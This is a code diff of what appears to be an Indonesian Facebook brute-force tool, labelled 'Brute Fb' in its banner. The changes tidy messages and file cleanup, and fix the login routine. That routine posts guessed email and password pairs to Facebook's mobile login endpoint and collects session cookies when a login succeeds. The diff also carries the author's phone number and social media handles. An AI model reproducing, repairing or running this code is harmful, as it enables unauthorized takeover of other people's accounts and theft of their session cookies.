@@ -6,7 +6,6 @@ Facebook  = 'Facebook.com/fikritampan305'
 Instagram = 'Instagram.com/fi_sinaga'
 Whatsapp  = '081269496231'
 YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
-Version   = '2.0'
 Syafii  = 100080716718035
 Postingan = 115753054458585
 komentar   = '\n\nhttps://www.facebook.com/' + str(Postingan)
@@ -60,7 +59,7 @@ def banner():
     war_dom = random.choice([P,K,M,J,U,H])
     print("""
 ___________________________________________________
- ____  __  __ ____  _____  |.Version 2.0
+ ____  __  __ ____  _____  |[•]Version 2.0
 |  _ \|  \/  | __ )|  ___| |[•]Mhd.Syafii
 | | | | |\/| |  _ \| |_    |[•]27-22-1998
 | |_| | |  | | |_) |  _|   |[•]Brute Fb
@@ -373,8 +372,8 @@ def listteman():
         cookie = {'cookie':open('login/cookie.json','r').read()}
     except IOError:
         print(f"{B} | ")
-        print(f"{P}[•]{M} Token modar dinggo wae ")
-        os.system("rm -rf masuk.txt")
+        print(f"{P}[•]{M} cookie modar dinggo wae ")
+        os.system("rm -rf login/token.json")
         os.system("rm -rf login/cookie.json")
         exit()
     try:
@@ -400,7 +399,7 @@ def publik():
     except IOError:
         print(f"{B} | ")
         print(f"{B} | ")
-        print(f"{P}[•]{M} Token modar dinggo wae ")
+        print(f"{P}[•]{M} cookie modar dinggo wae ")
         os.system("rm -rf login/token.json")
         os.system("rm -rf login/cookie.json")
         exit()
@@ -432,7 +431,7 @@ def followerss():
     except IOError:
         print(f"{B} | ")
         print(f"{B} | ")
-        print(f"{P}[•] Token modar dinggo wae ")
+        print(f"{P}[•] cookie modar dinggo wae ")
         os.system("rm -rf login/token.json")
         os.system("rm -rf login/cookie.json")
         exit()
@@ -1175,7 +1174,7 @@ def mobill(uid, fii):
 				if i.get("name") in bl:fii_gtg.update({i.get("name"):i.get("value")})
 				else:continue
 			except:pass
-		jck_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+		fii_gtg.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
 		deku = ses.post("https://mobile.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=fii_gtg)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
